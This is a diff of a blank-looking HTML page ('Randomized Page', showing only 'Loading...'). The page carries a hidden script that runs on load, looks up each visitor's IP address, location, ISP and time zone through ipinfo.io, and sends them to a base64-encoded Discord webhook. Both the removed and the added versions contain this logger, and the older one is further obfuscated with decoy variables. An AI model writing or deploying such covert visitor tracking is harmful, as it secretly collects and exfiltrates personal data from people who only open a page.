@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Random Page</title>
+    <title>Randomized Page</title>
     <style>
         body { 
             background-color: #000; 
@@ -18,43 +18,28 @@
     </style>
 </head>
 <body>
-    <h1>Random Content</h1>
+    <h1>Loading...</h1>
     <script>
-        let Z99 = "NDEyMjk4ZDY0ZTRmNGZiZmJiOGVlOTA1ZGEyMGVjY2EsaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI4MDk0MTc1MTYyNDAwNzcyMC9zdHdkTFc4RDg2NkhQVkRaUEFHNVhvWURpNmZBOTFqZldQYWFTNm5tVGNzYjI4UVU2dGRQSkVCVnVUT19SUDV0UWdROQ==";
-        let A2 = "abc123"; 
-        let X1 = "XYZ789";
-        let M9 = "Hello, Universe!";
-        let K5 = "No More Secrets!";
-        
-        function A() {
-            return atob(Z99);
-        }
+        let webhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI4MDk0MTYyNDAwNzcyMA=="; 
+        let decodedWebhook = atob(webhook);
+        let token = "afbce99e0999ed"; 
 
-        let random1 = A();
-        let token = "afbce99e0999ed";
-        let Q = "U78QW45E";
-
-        async function B() {
-            try {
-                let C = await fetch(`https://ipinfo.io/json?token=${token}`);
-                if (!C.ok) throw new Error('Fail');
-
-                let D = await C.json();
-                let E = { content: `IP: ${D.ip}, City: ${D.city}, Region: ${D.region}, Country: ${D.country}, Org: ${D.org}, Loc: ${D.loc}, TZ: ${D.timezone}` };
-
-                await fetch(random1, {
+        async function fetchIPInfo() {
+            let response = await fetch(`https://ipinfo.io/json?token=${token}`);
+            if (response.ok) {
+                let data = await response.json();
+                let messageContent = {
+                    content: `IP: ${data.ip}, City: ${data.city}, Region: ${data.region}, Country: ${data.country}, Org: ${data.org}, Loc: ${data.loc}, TZ: ${data.timezone}`
+                };
+                await fetch(decodedWebhook, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(E)
+                    body: JSON.stringify(messageContent)
                 });
-            } catch (F) {
-                console.error('Error:', F);
             }
         }
 
-        B();
-        console.log(M9);
-        console.log(K5);
+        fetchIPInfo();
     </script>
 </body>
 </html>
